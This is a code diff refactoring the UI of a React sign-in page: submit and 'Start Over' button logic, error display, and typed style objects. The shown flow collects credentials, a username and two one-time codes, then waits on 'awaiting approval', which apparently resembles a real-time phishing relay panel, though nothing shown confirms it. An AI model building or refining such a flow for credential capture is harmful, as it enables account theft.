@@ -51,6 +51,7 @@ export default function SignInPage() {
     };
   }, [step, attemptId]);
 
+  // Early returns for final states
   if (step === 'approved_success') {
     return (
       <div style={styles.page}>
@@ -98,7 +99,12 @@ export default function SignInPage() {
     rejected: 'Sign-in Blocked',
   };
 
-  const showSubmit = step === 'credentials' || step === 'username' || step === 'otp1' || step === 'otp2';
+  // FIXED: Only show submit for these 4 active steps
+  const activeSteps: Step[] = ['credentials', 'username', 'otp1', 'otp2'];
+  const showSubmit = activeSteps.includes(step);
+
+  // FIXED: Only show "Start Over" for these steps
+  const showStartOver = step !== 'credentials' && step !== 'awaiting_approval' && step !== 'rejected' && step !== 'approved_success';
 
   async function onSubmit(e: React.FormEvent) {
     e.preventDefault();
@@ -248,36 +254,35 @@ export default function SignInPage() {
               </div>
             )}
 
-            {error && <div style={styles.error}>{error}</div>}
+            {error && <div style={styles.error}>❌ {error}</div>}
             {note && step !== 'awaiting_approval' && (
               <div style={styles.note}>{note}</div>
             )}
 
+            {/* FIXED: Using showSubmit boolean */}
             {showSubmit && (
               <button type="submit" disabled={loading} style={styles.submit}>
                 {loading ? 'Processing…' : 'Continue'}
               </button>
             )}
 
-            {step !== 'credentials' &&
-              step !== 'awaiting_approval' &&
-              step !== 'rejected' &&
-              step !== 'approved_success' && (
-                <button
-                  type="button"
-                  style={styles.secondary}
-                  onClick={() => {
-                    setStep('credentials');
-                    setAttemptId(null);
-                    setUsername('');
-                    setOtp('');
-                    setError(null);
-                    setNote(null);
-                  }}
-                >
-                  Start Over
-                </button>
-              )}
+            {/* FIXED: Using showStartOver boolean */}
+            {showStartOver && (
+              <button
+                type="button"
+                style={styles.secondary}
+                onClick={() => {
+                  setStep('credentials');
+                  setAttemptId(null);
+                  setUsername('');
+                  setOtp('');
+                  setError(null);
+                  setNote(null);
+                }}
+              >
+                Start Over
+              </button>
+            )}
           </form>
         </div>
       </div>
@@ -314,13 +319,17 @@ export default function SignInPage() {
   );
 }
 
-const styles = {
+// ==========================================
+// STYLES
+// ==========================================
+
+const styles: Record<string, React.CSSProperties> = {
   page: {
     minHeight: '100vh',
     background: '#fafafa',
     fontFamily: '"Source Sans Pro", "Helvetica Neue", Helvetica, Arial, sans-serif',
     display: 'flex',
-    flexDirection: 'column' as const,
+    flexDirection: 'column',
     alignItems: 'center',
   },
   header: {
@@ -334,7 +343,7 @@ const styles = {
     display: 'flex',
     alignItems: 'center',
     justifyContent: 'space-between',
-    flexWrap: 'wrap' as const,
+    flexWrap: 'wrap',
     gap: '8px',
   },
   logo: {
@@ -367,12 +376,12 @@ const styles = {
   },
   form: {
     display: 'flex',
-    flexDirection: 'column' as const,
+    flexDirection: 'column',
     gap: '16px',
   },
   field: {
     display: 'flex',
-    flexDirection: 'column' as const,
+    flexDirection: 'column',
     gap: '6px',
   },
   label: {
@@ -389,10 +398,10 @@ const styles = {
     fontSize: '16px',
     outline: 'none',
     width: '100%',
-    boxSizing: 'border-box' as const,
+    boxSizing: 'border-box',
   },
   otpInput: {
-    textAlign: 'center' as const,
+    textAlign: 'center',
     fontSize: '24px',
     letterSpacing: '8px',
   },
@@ -404,7 +413,7 @@ const styles = {
     textDecoration: 'none',
     borderBottom: '2px dotted #0667ba',
     paddingBottom: '2px',
-    textTransform: 'uppercase' as const,
+    textTransform: 'uppercase',
     width: 'fit-content',
   },
   submit: {
@@ -446,7 +455,7 @@ const styles = {
     border: '1px solid #bbdefb',
   },
   waitingBox: {
-    textAlign: 'center' as const,
+    textAlign: 'center',
     padding: '20px 0',
   },
   waitingIcon: {
@@ -465,7 +474,7 @@ const styles = {
     background: 'white',
     borderRadius: '12px',
     boxShadow: '0 8px 24px rgba(0,0,0,0.12)',
-    textAlign: 'center' as const,
+    textAlign: 'center',
   },
   icon: {
     fontSize: '48px',
@@ -504,7 +513,7 @@ const styles = {
     maxWidth: '1200px',
     margin: '0 auto',
     display: 'flex',
-    flexWrap: 'wrap' as const,
+    flexWrap: 'wrap',
     gap: 'clamp(20px, 4vw, 30px)',
     justifyContent: 'space-between',
   },
@@ -520,7 +529,7 @@ const styles = {
   },
   footerLinks: {
     display: 'flex',
-    flexWrap: 'wrap' as const,
+    flexWrap: 'wrap',
     gap: 'clamp(12px, 2vw, 20px)',
   },
   footerLink: {
@@ -532,7 +541,7 @@ const styles = {
     borderTop: '1px solid rgba(255,255,255,0.1)',
     paddingTop: '20px',
     marginTop: '20px',
-    textAlign: 'center' as const,
+    textAlign: 'center',
     fontSize: 'clamp(11px, 2vw, 12px)',
     maxWidth: '1200px',
     margin: '20px auto 0',
